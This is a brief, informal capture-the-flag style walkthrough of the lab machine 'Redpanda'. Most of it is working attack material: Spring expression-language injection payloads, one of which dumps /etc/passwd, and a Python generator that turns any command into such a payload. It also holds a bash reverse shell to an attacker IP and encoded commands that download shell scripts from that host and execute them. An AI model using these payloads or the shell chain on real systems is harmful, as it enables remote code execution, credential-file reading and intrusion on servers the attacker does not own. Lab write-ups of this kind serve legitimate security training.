# Redpanda

┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn 10.129.67.246
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 01:16 EDT
Nmap scan report for 10.129.67.246
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds

 website at 8080 

### using wfuzz

list from https://raw.githubusercontent.com/six2dez/OneListForAll/main/onelistforallmicro.txt

### by sti 

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}

ou searched for: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false 

script to convert command into a payload code

```python
#!/usr/bin/python3

def main():

        command = "whoami" # specify command 
        convert = []

        for x in command:
            convert.append(str(ord(x)))
        
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % convert[0]

        for i in convert[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"

        print(payload)

if __name__ == "__main__":
    main()
```

we creatte asimple tcp reverse shell

```
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.18/9001 0>&1"
```

we give command for
```
"curl 10.10.14.18:8000/shell.sh --output /tmp/shell.sh"
```

```dotnetcli
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}
```

lets try with reverse.elf meterpereter

`"curl 10.10.14.18:8000/reverse.sh --output /tmp/reverse.sh"`

```dotnetcli
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(58)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}
```
```
ls -al /tmp
```

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112))).getInputStream())}
```


```
bash /tmp/reverse.sh
```

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}
```


```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(46).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(102))).getInputStream())}
```
next command 
```dotnetcli
"bash /tmp/shell.sh"
```

```dotnetcli
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104))).getInputStream())}
PS C:\Users\misthios\codeplay\oscp\htb\machines\redpanda> 
```

to get a fill ttys

https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

running linpeas.sh

we can get user shell though



